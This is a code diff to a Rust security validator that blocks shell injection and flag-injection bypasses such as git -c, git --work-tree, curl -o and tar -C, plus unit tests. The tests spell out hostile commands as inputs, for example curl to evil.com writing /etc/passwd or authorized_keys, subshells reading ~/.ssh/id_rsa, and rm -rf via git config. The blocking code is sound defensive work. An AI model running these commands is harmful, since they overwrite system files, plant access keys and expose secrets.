@@ -297,6 +297,12 @@ impl SecurityValidator {
             }
         }
 
+        // Check for shell injection (variable expansion, subshells, backticks)
+        // This must be checked early to prevent bypass via injection
+        if let Some(result) = check_shell_injection(cmd_trimmed) {
+            return result;
+        }
+
         // Extract base command
         let base_cmd = extract_base_command(cmd_trimmed);
 
@@ -414,6 +420,69 @@ impl SecurityValidator {
             );
         }
 
+        // === FLAG INJECTION ATTACKS ===
+        // These can bypass command allowlists by injecting dangerous options
+
+        // Git config injection: git -c can set arbitrary config including core.editor
+        // which gets executed. Example: git -c core.editor='rm -rf /' status
+        if cmd_lower.starts_with("git ")
+            && (cmd_lower.contains(" -c ") || cmd_lower.contains(" --config "))
+        {
+            return Some(
+                ValidationResult::blocked(
+                    RiskLevel::High,
+                    "Git config injection via -c/--config flag is blocked",
+                )
+                .with_pattern("git -c / git --config")
+                .with_alternative("Set git config in .gitconfig instead of inline flags"),
+            );
+        }
+
+        // Git work-tree/git-dir manipulation can escape sandbox
+        if cmd_lower.starts_with("git ")
+            && (cmd_lower.contains("--work-tree=")
+                || cmd_lower.contains("--git-dir=")
+                || cmd_lower.contains(" --work-tree ")
+                || cmd_lower.contains(" --git-dir "))
+        {
+            return Some(
+                ValidationResult::blocked(
+                    RiskLevel::High,
+                    "Git work-tree/git-dir manipulation can escape sandbox",
+                )
+                .with_pattern("git --work-tree / git --git-dir")
+                .with_alternative("Use git commands in the current repository"),
+            );
+        }
+
+        // Curl/wget dangerous flags that can write arbitrary files or execute code
+        if cmd_lower.starts_with("curl ") || cmd_lower.starts_with("wget ") {
+            // -o can write to arbitrary locations
+            if cmd_lower.contains(" -o ") || cmd_lower.contains(" --output ") {
+                return Some(
+                    ValidationResult::blocked(
+                        RiskLevel::High,
+                        "curl/wget output redirection can overwrite files",
+                    )
+                    .with_pattern("-o / --output")
+                    .with_alternative("Pipe to cat or redirect explicitly"),
+                );
+            }
+        }
+
+        // Tar extraction to arbitrary path (can overwrite system files)
+        // Note: Check original command for -C since it's case-sensitive in tar
+        if cmd_lower.starts_with("tar ") && command.contains(" -C ") {
+            return Some(
+                ValidationResult::blocked(
+                    RiskLevel::High,
+                    "tar -C can extract to arbitrary directories",
+                )
+                .with_pattern("tar -C")
+                .with_alternative("Extract in current directory and move files"),
+            );
+        }
+
         None
     }
 
@@ -467,7 +536,11 @@ impl SecurityValidator {
 
 // Helper functions
 
-/// Extract the base command (first word or first two for compound commands)
+/// Extract the base command, properly handling flags before subcommands
+///
+/// For compound commands like `git status`, extracts `git status`.
+/// For commands with flags before subcommands like `git -c foo=bar status`,
+/// extracts `git status` (skipping the flags).
 fn extract_base_command(command: &str) -> String {
     let parts: Vec<&str> = command.split_whitespace().collect();
     if parts.is_empty() {
@@ -476,11 +549,118 @@ fn extract_base_command(command: &str) -> String {
 
     // For commands like "git status", "cargo build", etc.
     let compound_prefixes = ["git", "cargo", "npm", "pip", "bd", "docker", "kubectl"];
-    if parts.len() >= 2 && compound_prefixes.contains(&parts[0]) {
-        format!("{} {}", parts[0], parts[1])
+    let first = parts[0];
+
+    if compound_prefixes.contains(&first) && parts.len() >= 2 {
+        // Find the actual subcommand, skipping any flags
+        // Flags can be: -x, --flag, -c value, --config=value, --config value
+        let mut i = 1;
+        while i < parts.len() {
+            let part = parts[i];
+            if part.starts_with('-') {
+                // This is a flag
+                // Check if it's a flag that takes a value (not combined like -abc)
+                // Common flags that take values: -c, -C, --config, etc.
+                let takes_value = part == "-c"
+                    || part == "-C"
+                    || part == "--config"
+                    || part == "--work-tree"
+                    || part == "--git-dir"
+                    || part == "-m"
+                    || part == "--message"
+                    || (part.len() == 2 && part.starts_with('-'));
+
+                // If it contains '=' it's self-contained
+                if part.contains('=') {
+                    i += 1;
+                } else if takes_value && i + 1 < parts.len() && !parts[i + 1].starts_with('-') {
+                    // Skip the flag and its value
+                    i += 2;
+                } else {
+                    i += 1;
+                }
+            } else {
+                // Found the subcommand
+                return format!("{} {}", first, part);
+            }
+        }
+        // No subcommand found, return just the prefix
+        first.to_string()
     } else {
-        parts[0].to_string()
+        first.to_string()
     }
+}
+
+/// Check for shell injection patterns (variable expansion, subshells, backticks)
+///
+/// Returns Some(ValidationResult) if injection is detected, None otherwise.
+fn check_shell_injection(command: &str) -> Option<ValidationResult> {
+    // Check for variable expansion: $VAR, ${VAR}, $(...), $(...)
+    // We need to be careful to allow safe patterns like $? or $$ but block dangerous ones
+
+    // Block $(command) subshell execution
+    if command.contains("$(") {
+        return Some(
+            ValidationResult::blocked(
+                RiskLevel::Blocked,
+                "Subshell execution $(command) is blocked",
+            )
+            .with_pattern("$(...)"),
+        );
+    }
+
+    // Block backtick command substitution
+    if command.contains('`') {
+        return Some(
+            ValidationResult::blocked(
+                RiskLevel::Blocked,
+                "Backtick command substitution is blocked",
+            )
+            .with_pattern("`...`"),
+        );
+    }
+
+    // Block ${...} variable expansion (more complex forms)
+    if command.contains("${") {
+        return Some(
+            ValidationResult::blocked(
+                RiskLevel::Blocked,
+                "Variable expansion ${...} is blocked",
+            )
+            .with_pattern("${...}"),
+        );
+    }
+
+    // Block $VARIABLE patterns (but allow $? and $$ which are common in scripts)
+    // Pattern: $ followed by a letter or underscore (start of variable name)
+    let bytes = command.as_bytes();
+    for i in 0..bytes.len() {
+        if bytes[i] == b'$' && i + 1 < bytes.len() {
+            let next = bytes[i + 1];
+            // Allow $?, $$, $!, $#, $@, $*, $0-$9 (special shell variables)
+            // Block $LETTER or $_ (environment variables)
+            if next.is_ascii_alphabetic() || next == b'_' {
+                // Extract the variable name for the error message
+                let var_start = i + 1;
+                let mut var_end = var_start;
+                while var_end < bytes.len()
+                    && (bytes[var_end].is_ascii_alphanumeric() || bytes[var_end] == b'_')
+                {
+                    var_end += 1;
+                }
+                let var_name = &command[var_start..var_end];
+                return Some(
+                    ValidationResult::blocked(
+                        RiskLevel::Blocked,
+                        &format!("Variable expansion ${} is blocked", var_name),
+                    )
+                    .with_pattern(&format!("${}", var_name)),
+                );
+            }
+        }
+    }
+
+    None
 }
 
 /// Extract paths from a command (simple heuristic)
@@ -626,5 +806,186 @@ mod tests {
         // Add custom blocked pattern
         validator.block_pattern("dangerous-thing");
         assert!(!validator.validate("run dangerous-thing").allowed);
+    }
+
+    // === SHELL INJECTION TESTS ===
+
+    #[test]
+    fn test_variable_expansion_blocked() {
+        let validator = SecurityValidator::new();
+
+        // Environment variables should be blocked
+        assert!(!validator.validate("echo $HOME").allowed);
+        assert!(!validator.validate("echo $USER").allowed);
+        assert!(!validator.validate("echo $PATH").allowed);
+        assert!(!validator.validate("cat $SOME_FILE").allowed);
+        assert!(!validator.validate("rm $TARGET").allowed);
+
+        // Variables with underscores
+        assert!(!validator.validate("echo $MY_VAR").allowed);
+        assert!(!validator.validate("echo $_VAR").allowed);
+
+        // Verify error message mentions the variable
+        let result = validator.validate("echo $HOME");
+        assert!(result.reason.contains("HOME"));
+    }
+
+    #[test]
+    fn test_subshell_execution_blocked() {
+        let validator = SecurityValidator::new();
+
+        // $(command) should be blocked
+        assert!(!validator.validate("echo $(whoami)").allowed);
+        assert!(!validator.validate("cat $(pwd)/file").allowed);
+        assert!(!validator.validate("rm -rf $(find . -name '*.tmp')").allowed);
+        assert!(!validator.validate("git status $(echo args)").allowed);
+
+        // Nested subshells
+        assert!(!validator.validate("echo $(cat $(pwd)/file)").allowed);
+    }
+
+    #[test]
+    fn test_backtick_execution_blocked() {
+        let validator = SecurityValidator::new();
+
+        // Backtick command substitution should be blocked
+        assert!(!validator.validate("echo `whoami`").allowed);
+        assert!(!validator.validate("cat `pwd`/file").allowed);
+        assert!(!validator.validate("rm `find . -name '*.tmp'`").allowed);
+        assert!(!validator.validate("echo `id`").allowed);
+    }
+
+    #[test]
+    fn test_brace_expansion_blocked() {
+        let validator = SecurityValidator::new();
+
+        // ${...} should be blocked
+        assert!(!validator.validate("echo ${HOME}").allowed);
+        assert!(!validator.validate("echo ${USER:-default}").allowed);
+        assert!(!validator.validate("echo ${PATH:0:10}").allowed);
+        assert!(!validator.validate("rm ${FILE}").allowed);
+    }
+
+    #[test]
+    fn test_special_shell_vars_allowed() {
+        let validator = SecurityValidator::new();
+
+        // These special shell variables should NOT trigger the block
+        // (they don't start with a letter or underscore)
+        // Note: These are commonly used in scripts and are not security risks
+        // $?, $$, $!, $#, $@, $*, $0-$9 don't match our pattern
+        assert!(validator.validate("echo $?").allowed); // exit status
+        assert!(validator.validate("echo $0").allowed); // script name
+        assert!(validator.validate("echo $1").allowed); // first arg
+    }
+
+    // === FLAG INJECTION TESTS ===
+
+    #[test]
+    fn test_git_config_injection_blocked() {
+        let validator = SecurityValidator::new();
+
+        // git -c can inject arbitrary config, including executable values
+        assert!(!validator.validate("git -c core.editor=rm status").allowed);
+        assert!(
+            !validator
+                .validate("git -c core.editor='rm -rf /' status")
+                .allowed
+        );
+        assert!(!validator.validate("git -c alias.x='!rm -rf /' x").allowed);
+        assert!(!validator.validate("git --config core.pager=less status").allowed);
+
+        // Should still allow normal git commands
+        assert!(validator.validate("git status").allowed);
+        assert!(validator.validate("git log --oneline").allowed);
+    }
+
+    #[test]
+    fn test_git_worktree_injection_blocked() {
+        let validator = SecurityValidator::new();
+
+        // git --work-tree and --git-dir can escape the sandbox
+        assert!(!validator.validate("git --work-tree=/etc status").allowed);
+        assert!(!validator.validate("git --git-dir=/tmp/.git status").allowed);
+        assert!(!validator.validate("git --work-tree=/home/user status").allowed);
+        assert!(!validator.validate("git --git-dir=../other/.git log").allowed);
+    }
+
+    #[test]
+    fn test_curl_wget_output_blocked() {
+        let validator = SecurityValidator::new();
+
+        // Output to file can overwrite arbitrary files
+        assert!(!validator.validate("curl http://evil.com -o /etc/passwd").allowed);
+        assert!(!validator.validate("wget http://evil.com -o /tmp/script.sh").allowed);
+        assert!(!validator.validate("curl --output /home/user/.ssh/authorized_keys http://evil.com").allowed);
+    }
+
+    #[test]
+    fn test_tar_extraction_blocked() {
+        let validator = SecurityValidator::new();
+
+        // tar -C can extract to arbitrary directories
+        assert!(!validator.validate("tar -xf archive.tar -C /etc").allowed);
+        assert!(!validator.validate("tar -xzf file.tgz -C /home/user").allowed);
+    }
+
+    // === EXTRACT BASE COMMAND WITH FLAGS TESTS ===
+
+    #[test]
+    fn test_extract_base_command_with_flags() {
+        // Should skip flags and find the actual subcommand
+        assert_eq!(extract_base_command("git -c foo=bar status"), "git status");
+        assert_eq!(extract_base_command("git --config foo=bar log"), "git log");
+        assert_eq!(extract_base_command("git -C /tmp status"), "git status");
+
+        // Multiple flags before subcommand
+        assert_eq!(
+            extract_base_command("git -c a=b -c c=d status"),
+            "git status"
+        );
+
+        // Flag with = syntax
+        assert_eq!(
+            extract_base_command("git --config=foo.bar=baz status"),
+            "git status"
+        );
+
+        // No subcommand, just prefix with flags
+        assert_eq!(extract_base_command("git -c foo=bar"), "git");
+
+        // Normal commands still work
+        assert_eq!(extract_base_command("git status --short"), "git status");
+        assert_eq!(extract_base_command("cargo build --release"), "cargo build");
+    }
+
+    // === INTEGRATION TESTS ===
+
+    #[test]
+    fn test_combined_attack_vectors() {
+        let validator = SecurityValidator::new();
+
+        // Combining multiple attack vectors
+        assert!(
+            !validator
+                .validate("git -c core.editor='rm -rf $HOME' status")
+                .allowed
+        );
+        assert!(!validator.validate("echo $(cat $HOME/.ssh/id_rsa)").allowed);
+        assert!(!validator.validate("curl `cat /etc/passwd` | sh").allowed);
+    }
+
+    #[test]
+    fn test_allowlist_bypass_prevention() {
+        let validator = SecurityValidator::new();
+
+        // These look like allowed commands but have injection
+        // "git status" is allowed, but not with -c flag
+        let result = validator.validate("git -c core.editor=malicious status");
+        assert!(!result.allowed);
+
+        // "echo" might be allowed, but not with variable expansion
+        let result = validator.validate("echo $SECRET_KEY");
+        assert!(!result.allowed);
     }
 }
